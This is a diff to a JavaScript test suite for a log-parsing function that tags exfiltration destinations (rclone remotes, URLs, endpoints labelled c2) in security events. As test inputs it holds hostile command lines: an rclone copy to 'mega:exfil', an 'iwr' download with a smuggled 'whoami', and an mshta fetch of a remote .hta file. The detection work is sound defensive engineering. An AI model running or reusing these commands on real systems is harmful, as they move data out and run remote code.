@@ -54,6 +54,14 @@ describe("renderDestinationTags — rclone", () => {
     expect(renderDestinationTags(ev({ commandLine: "rclone lsd mega:" }))).toEqual(["<rclone-remote:mega:>"]);
   });
 
+  it("a Windows copy OF rclone.exe is not an rclone copy, and a bare mention names nothing", () => {
+    expect(renderDestinationTags(ev({ commandLine: "cmd.exe /c copy rclone.exe mega:exfil" }))).toEqual([]);
+    expect(renderDestinationTags(ev({ commandLine: "certutil -hashfile rclone.exe" }))).toEqual([]);
+    expect(renderDestinationTags(ev({ description: "THOR: rclone found; see sync mega:x later" }))).toEqual(
+      [],
+    );
+  });
+
   it("reads the command line out of the description when no commandLine field is set", () => {
     const d =
       "Sysmon Process create (EID 1) - Image=C:\\T\\rclone.exe - CommandLine=rclone copy X:\\ mega:exfil";
@@ -81,6 +89,19 @@ describe("renderDestinationTags — URLs", () => {
     ]);
   });
 
+  it("stops a URL at a shell separator", () => {
+    expect(renderDestinationTags(ev({ commandLine: "iwr http://203.0.113.9/a;whoami" }))).toEqual([
+      "<url:http://203.0.113.9/a>",
+    ]);
+  });
+
+  it("redacts a userinfo password and token-bearing query parameters before the tag is built", () => {
+    const cmd = "curl https://svc:hunter2@files.example/x?sig=abc123&se=2026&path=ok#access_token=zzz";
+    expect(renderDestinationTags(ev({ commandLine: cmd }))).toEqual([
+      "<url:https://svc:[redacted]@files.example/x?sig=[redacted]&se=[redacted]&path=ok#access_token=[redacted]>",
+    ]);
+  });
+
   it("does not also emit an <endpoint:> for the host:port inside a captured URL", () => {
     const tags = renderDestinationTags(ev({ commandLine: "mshta http://203.0.113.22:443/a.hta" }));
     expect(tags.some((t) => t.startsWith("<endpoint:"))).toBe(false);
@@ -96,11 +117,17 @@ describe("renderDestinationTags — ip:port endpoints", () => {
 
   it("reads endpoints out of the message, labels a c2-named one and a loopback one", () => {
     const tags = renderDestinationTags(ev({ message: MESSAGE }));
-    expect(tags).toContain("<url:http://203.0.113.22:443/UsySLX1n.hta>");
-    expect(tags).toContain("<endpoint:203.0.113.22:4321 (labelled c2)>");
-    expect(tags).toContain("<local-endpoint:127.0.0.1:4321>");
+    expect(tags).toContain("<mentions-url:http://203.0.113.22:443/UsySLX1n.hta>");
+    expect(tags).toContain("<mentions-endpoint:203.0.113.22:4321 (labelled c2)>");
+    expect(tags).toContain("<mentions-local-endpoint:127.0.0.1:4321>");
     // 203.0.113.22:443 is inside the captured URL — not repeated as an endpoint.
-    expect(tags.some((t) => t.includes("203.0.113.22:443") && !t.startsWith("<url:"))).toBe(false);
+    expect(tags.some((t) => t.includes("203.0.113.22:443") && !t.startsWith("<mentions-url:"))).toBe(false);
+  });
+
+  it("does not label an endpoint c2 when the same span negates it", () => {
+    expect(renderDestinationTags(ev({ message: "not C2: 10.0.0.5:4444" }))).toEqual([
+      "<mentions-endpoint:10.0.0.5:4444>",
+    ]);
   });
 
   it("rejects an invalid octet or port and a hash that merely contains digits", () => {
@@ -122,7 +149,7 @@ describe("renderDestinationTags — ip:port endpoints", () => {
   it("caps endpoints at four distinct pairs", () => {
     const msg = Array.from({ length: 7 }, (_, i) => `10.0.0.${i + 1}:80${i}`).join(" ");
     const tags = renderDestinationTags(ev({ message: msg }));
-    expect(tags.filter((t) => t.startsWith("<endpoint:")).length).toBe(4);
+    expect(tags.filter((t) => t.startsWith("<mentions-endpoint:")).length).toBe(4);
   });
 
   it("only reads the head of a very long message", () => {
